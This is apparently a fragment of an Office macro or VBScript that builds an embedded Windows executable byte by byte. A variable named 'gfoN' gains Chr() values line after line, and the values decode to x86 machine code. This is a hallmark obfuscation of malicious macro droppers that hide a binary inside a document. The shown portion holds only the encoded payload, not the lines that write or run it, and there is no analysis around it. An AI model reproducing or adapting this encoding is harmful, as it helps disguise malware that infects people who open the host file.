gfoN=gfoN&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(193)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(228)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(117)&Chr(228)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(3)&Chr(200)&Chr(235)&Chr(17)&Chr(139)&Chr(85)&Chr(8)&Chr(43)&Chr(80)&Chr(12)&Chr(129)&Chr(250)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(114)&Chr(9)&Chr(131)&Chr(192)&Chr(20)&Chr(59)&Chr(193)&Chr(114)&Chr(235)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(16)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(87)&Chr(139)&Chr(254)&Chr(43)&Chr(121)&Chr(12)&Chr(131)&Chr(198)&Chr(252)&Chr(193)&Chr(239)&Chr(15)&Chr(139)&Chr(207)&Chr(105)&Chr(201)
gfoN=gfoN&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(240)&Chr(139)&Chr(14)&Chr(73)&Chr(137)&Chr(77)&Chr(252)&Chr(246)&Chr(193)&Chr(1)&Chr(15)&Chr(133)&Chr(211)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(141)&Chr(28)&Chr(49)&Chr(139)&Chr(19)&Chr(137)&Chr(85)&Chr(244)&Chr(139)&Chr(86)&Chr(252)&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(85)&Chr(244)&Chr(137)&Chr(93)&Chr(12)&Chr(246)&Chr(194)&Chr(1)&Chr(117)&Chr(116)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(25)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(198)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(184)&Chr(68)&Chr(254)
gfoN=gfoN&Chr(9)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(74)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(2)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(83)&Chr(8)&Chr(139)&Chr(91)&Chr(4)&Chr(139)&Chr(77)&Chr(252)&Chr(3)&Chr(77)&Chr(244)&Chr(137)&Chr(90)&Chr(4)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(90)&Chr(4)&Chr(139)&Chr(82)&Chr(8)&Chr(137)&Chr(83)&Chr(8)&Chr(137)&Chr(77)&Chr(252)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(93)&Chr(248)&Chr(131)&Chr(227)&Chr(1)&Chr(137)&Chr(93)&Chr(244)&Chr(15)&Chr(133)&Chr(143)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(43)&Chr(117)&Chr(248)&Chr(139)&Chr(93)&Chr(248)&Chr(193)&Chr(251)&Chr(4)&Chr(106)&Chr(63)&Chr(137)&Chr(117)&Chr(12)&Chr(75)&Chr(94)&Chr(59)&Chr(222)&Chr(118)&Chr(2)&Chr(139)&Chr(222)&Chr(3)&Chr(77)&Chr(248)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(137)&Chr(77)&Chr(252)&Chr(59)&Chr(214)&Chr(118)&Chr(2)&Chr(139)&Chr(214)&Chr(59)&Chr(218)&Chr(116)&Chr(94)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(59)&Chr(113)&Chr(8)&Chr(117)&Chr(59)&Chr(190)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(251)&Chr(32)&Chr(115)&Chr(23)&Chr(139)&Chr(203)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(116)&Chr(184)&Chr(68)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(33)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(49)&Chr(235)&Chr(26)&Chr(141)&Chr(75)&Chr(224)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(180)&Chr(184)&Chr(196)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(113)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(8)&Chr(139)&Chr(73)&Chr(4)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(139)&Chr(73)&Chr(8)&Chr(137)&Chr(78)&Chr(8)&Chr(139)&Chr(117)&Chr(12)&Chr(235)&Chr(3)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(125)&Chr(244)&Chr(0)&Chr(117)&Chr(8)&Chr(59)&Chr(218)&Chr(15)&Chr(132)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(240)&Chr(141)&Chr(12)&Chr(209)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(78)&Chr(8)&Chr(137)&Chr(94)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(78)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(78)&Chr(4)&Chr(59)&Chr(78)&Chr(8)&Chr(117)&Chr(96)&Chr(138)&Chr(76)&Chr(2)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)
gfoN=gfoN&Chr(193)&Chr(136)&Chr(76)&Chr(2)&Chr(4)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(37)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(202)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(68)&Chr(184)&Chr(68)&Chr(9)&Chr(24)&Chr(235)&Chr(41)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(74)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(74)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(141)&Chr(132)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(252)&Chr(137)&Chr(6)&Chr(137)&Chr(68)&Chr(48)&Chr(252)&Chr(139)&Chr(69)&Chr(240)
gfoN=gfoN&Chr(255)&Chr(8)&Chr(15)&Chr(133)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(112)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(193)&Chr(225)&Chr(15)&Chr(3)&Chr(72)&Chr(12)&Chr(187)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(83)&Chr(81)&Chr(255)&Chr(214)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(80)&Chr(8)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(164)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(254)&Chr(72)&Chr(67)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(72)&Chr(16)&Chr(128)&Chr(121)&Chr(67)&Chr(0)&Chr(117)&Chr(9)&Chr(131)&Chr(96)&Chr(4)&Chr(254)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(120)&Chr(8)&Chr(255)&Chr(117)&Chr(101)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(112)&Chr(12)&Chr(255)&Chr(214)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(112)&Chr(16)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(139)&Chr(21)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(141)&Chr(76)&Chr(17)&Chr(236)&Chr(81)&Chr(141)&Chr(72)&Chr(20)&Chr(81)&Chr(80)&Chr(232)&Chr(117)
gfoN=gfoN&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(59)&Chr(5)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(4)&Chr(131)&Chr(109)&Chr(8)&Chr(20)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(161)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(59)&Chr(240)&Chr(117)&Chr(52)&Chr(131)&Chr(192)&Chr(16)&Chr(107)&Chr(192)&Chr(20)&Chr(80)&Chr(255)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(59)&Chr(199)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(120)&Chr(131)&Chr(5)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(16)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(246)&Chr(20)&Chr(3)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(104)&Chr(196)&Chr(65)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(199)&Chr(106)&Chr(4)&Chr(104)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(12)&Chr(59)&Chr(199)&Chr(117)&Chr(18)&Chr(255)&Chr(118)&Chr(16)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)
gfoN=gfoN&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(155)&Chr(131)&Chr(78)&Chr(8)&Chr(255)&Chr(137)&Chr(62)&Chr(137)&Chr(126)&Chr(4)&Chr(255)&Chr(5)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(70)&Chr(16)&Chr(131)&Chr(8)&Chr(255)&Chr(139)&Chr(198)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(8)&Chr(83)&Chr(86)&Chr(139)&Chr(113)&Chr(16)&Chr(87)&Chr(51)&Chr(219)&Chr(235)&Chr(3)&Chr(3)&Chr(192)&Chr(67)&Chr(133)&Chr(192)&Chr(125)&Chr(249)&Chr(139)&Chr(195)&Chr(105)&Chr(192)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(132)&Chr(48)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(63)&Chr(137)&Chr(69)&Chr(248)&Chr(90)&Chr(137)&Chr(64)&Chr(8)&Chr(137)&Chr(64)&Chr(4)&Chr(131)&Chr(192)&Chr(8)&Chr(74)&Chr(117)&Chr(244)&Chr(106)&Chr(4)&Chr(139)&Chr(251)&Chr(104)
gfoN=gfoN&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(193)&Chr(231)&Chr(15)&Chr(3)&Chr(121)&Chr(12)&Chr(104)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(157)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(151)&Chr(0)&Chr(112)&Chr(0)&Chr(0)&Chr(137)&Chr(85)&Chr(252)&Chr(59)&Chr(250)&Chr(119)&Chr(67)&Chr(139)&Chr(202)&Chr(43)&Chr(207)&Chr(193)&Chr(233)&Chr(12)&Chr(141)&Chr(71)&Chr(16)&Chr(65)&Chr(131)&Chr(72)&Chr(248)&Chr(255)&Chr(131)&Chr(136)&Chr(236)&Chr(15)&Chr(0)&Chr(0)&Chr(255)&Chr(141)&Chr(144)&Chr(252)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(16)&Chr(141)&Chr(144)&Chr(252)&Chr(239)&Chr(255)&Chr(255)&Chr(199)&Chr(64)&Chr(252)&Chr(240)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(80)&Chr(4)&Chr(199)&Chr(128)&Chr(232)&Chr(15)&Chr(0)&Chr(0)&Chr(240)
gfoN=gfoN&Chr(15)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(203)&Chr(139)&Chr(85)&Chr(252)&Chr(139)&Chr(69)&Chr(248)&Chr(5)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(79)&Chr(12)&Chr(137)&Chr(72)&Chr(4)&Chr(137)&Chr(65)&Chr(8)&Chr(141)&Chr(74)&Chr(12)&Chr(137)&Chr(72)&Chr(8)&Chr(137)&Chr(65)&Chr(4)&Chr(131)&Chr(100)&Chr(158)&Chr(68)&Chr(0)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(188)&Chr(158)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(138)&Chr(70)&Chr(67)&Chr(138)&Chr(200)&Chr(254)&Chr(193)&Chr(132)&Chr(192)&Chr(139)&Chr(69)&Chr(8)&Chr(136)&Chr(78)&Chr(67)&Chr(117)&Chr(3)&Chr(9)&Chr(120)&Chr(4)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(203)&Chr(211)&Chr(234)&Chr(247)&Chr(210)&Chr(33)&Chr(80)&Chr(8)&Chr(139)&Chr(195)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)
gfoN=gfoN&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(16)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(16)&Chr(87)&Chr(139)&Chr(125)&Chr(12)&Chr(139)&Chr(215)&Chr(43)&Chr(81)&Chr(12)&Chr(131)&Chr(198)&Chr(23)&Chr(193)&Chr(234)&Chr(15)&Chr(139)&Chr(202)&Chr(105)&Chr(201)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(244)&Chr(139)&Chr(79)&Chr(252)&Chr(131)&Chr(230)&Chr(240)&Chr(73)&Chr(59)&Chr(241)&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(139)&Chr(31)&Chr(137)&Chr(77)&Chr(16)&Chr(137)&Chr(93)&Chr(252)&Chr(15)&Chr(142)&Chr(85)&Chr(1)&Chr(0)&Chr(0)&Chr(246)&Chr(195)&Chr(1)&Chr(15)&Chr(133)&Chr(69)&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(217)&Chr(59)&Chr(243)&Chr(15)&Chr(143)&Chr(59)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(193)&Chr(249)&Chr(4)
gfoN=gfoN&Chr(73)&Chr(137)&Chr(77)&Chr(248)&Chr(131)&Chr(249)&Chr(63)&Chr(118)&Chr(6)&Chr(106)&Chr(63)&Chr(89)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(95)&Chr(4)&Chr(59)&Chr(95)&Chr(8)&Chr(117)&Chr(67)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(249)&Chr(32)&Chr(115)&Chr(26)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(9)&Chr(117)&Chr(38)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(31)&Chr(131)&Chr(193)&Chr(224)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(95)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)
gfoN=gfoN&Chr(79)&Chr(4)&Chr(139)&Chr(127)&Chr(8)&Chr(137)&Chr(121)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(43)&Chr(206)&Chr(1)&Chr(77)&Chr(252)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(15)&Chr(142)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(255)&Chr(4)&Chr(79)&Chr(141)&Chr(76)&Chr(49)&Chr(252)&Chr(131)&Chr(255)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(95)&Chr(139)&Chr(93)&Chr(244)&Chr(141)&Chr(28)&Chr(251)&Chr(137)&Chr(93)&Chr(16)&Chr(139)&Chr(91)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(16)&Chr(137)&Chr(89)&Chr(8)&Chr(137)&Chr(75)&Chr(4)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(139)&Chr(89)&Chr(4)&Chr(59)&Chr(89)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(7)&Chr(4)&Chr(136)&Chr(77)&Chr(19)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(7)&Chr(4)&Chr(131)
gfoN=gfoN&Chr(255)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(207)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(207)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(79)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(132)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(79)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(68)&Chr(50)&Chr(252)&Chr(137)&Chr(8)&Chr(137)&Chr(76)&Chr(1)&Chr(252)&Chr(235)&Chr(3)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(137)&Chr(66)&Chr(252)
gfoN=gfoN&Chr(137)&Chr(68)&Chr(50)&Chr(248)&Chr(233)&Chr(60)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(233)&Chr(56)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(141)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(12)&Chr(41)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(1)&Chr(137)&Chr(75)&Chr(252)&Chr(141)&Chr(92)&Chr(51)&Chr(252)&Chr(139)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(32)&Chr(93)&Chr(12)&Chr(137)&Chr(75)&Chr(252)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(246)&Chr(69)&Chr(252)&Chr(1)&Chr(15)&Chr(133)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(79)&Chr(4)&Chr(59)&Chr(79)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(254)&Chr(32)
gfoN=gfoN&Chr(115)&Chr(25)&Chr(139)&Chr(206)&Chr(211)&Chr(235)&Chr(141)&Chr(116)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(14)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(78)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(119)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(119)&Chr(8)&Chr(139)&Chr(48)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(117)&Chr(16)&Chr(3)&Chr(117)&Chr(252)&Chr(137)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(77)&Chr(244)
gfoN=gfoN&Chr(141)&Chr(12)&Chr(241)&Chr(139)&Chr(121)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(75)&Chr(4)&Chr(137)&Chr(89)&Chr(8)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(6)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(6)&Chr(4)&Chr(131)&Chr(254)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(206)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(57)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(206)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(224)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(121)&Chr(4)&Chr(141)&Chr(132)&Chr(144)
gfoN=gfoN&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(78)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(16)&Chr(137)&Chr(3)&Chr(137)&Chr(68)&Chr(24)&Chr(252)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(8)&Chr(107)&Chr(192)&Chr(20)&Chr(3)&Chr(5)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(193)&Chr(23)&Chr(131)&Chr(225)&Chr(240)&Chr(137)&Chr(77)&Chr(240)&Chr(193)&Chr(249)&Chr(4)&Chr(83)&Chr(73)&Chr(131)&Chr(249)&Chr(32)&Chr(86)&Chr(87)&Chr(125)&Chr(11)&Chr(131)&Chr(206)&Chr(255)&Chr(211)&Chr(238)&Chr(131)&Chr(77)&Chr(248)&Chr(255)&Chr(235)&Chr(13)&Chr(131)&Chr(193)&Chr(224)&Chr(131)&Chr(202)&Chr(255)&Chr(51)&Chr(246)&Chr(211)&Chr(234)
